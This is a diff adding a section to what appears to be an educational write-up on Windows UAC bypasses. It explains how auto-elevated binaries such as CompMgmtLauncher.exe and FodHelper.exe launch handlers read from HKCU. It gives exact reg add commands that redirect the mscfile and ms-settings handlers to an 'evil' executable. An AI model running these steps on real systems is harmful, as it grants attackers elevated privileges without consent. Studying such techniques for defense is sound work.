@@ -99,7 +99,7 @@ As can be seen, a child process will be created with [CreateProcessW](https://le
 
 The idea is that auto-elevated processes will spawn child processes with the same integrity level (at least by default, when using `CreateProcessW` as we've seen). A similar idea happens with the `ShellExecute(Ex)W\A` API, as we'll see soon.
 
-## HKCU and HKCR
+## HKCU and file associations
 This code was taken from an old version of `CompMgmtLauncher.exe`, which was an auto-elevated executable:
 
 ```c
@@ -152,3 +152,26 @@ According to our plan, we can change the file association of `mscfile` easily, t
 1. Run `reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_EXPAND_SZ /d "%temp%\my_evil_handler.exe" /f`.
 2. Run `CompMgmtLauncher.exe`.
 3. Delete the registry path under `HKCU` that we just created.
+
+## HKCU and protocol associations
+Simialrly to file associations, users can also change their URL schema \ protocol associations.  
+This is helpful if, for instance, a user wishes to use a different browser - the handler for the `http://` schema would be different.  
+Here's an example from `Fodhelper.exe`:
+
+```c
+memset(&tShlex, 0, 0x6C);
+tShlex.hwnd = NULL;
+tShlex.lpVerb = L"open";
+tShlex.cbSize = 112;
+tShlex.lpFile = L"ms-settings:optionalfeatures";
+tShlex.fMask = 1280;
+tShlex.fShow = 1;
+ShellExecuteExW(&tShlex);
+```
+
+As before, the code calls the [ShellExecuteExW](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw) function to execute a child process, this time to use the `ms-settings` URL schema. Very similarly, we can write to `HKCU`:
+1. Run `reg query HKCU\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\ms-settings\UserChoice /v ProgId` and save that as `%SettingsProgId%`.
+2. Run `reg add HKCU\Software\Classes\%SettingsProgId%\shell\open\command /ve /t REG_EXPAND_SZ /d "%temp%\my_evil_handler.exe" /f`.
+3. Run `FodHelper.exe`.
+4. Delete the registry key we just created.
+
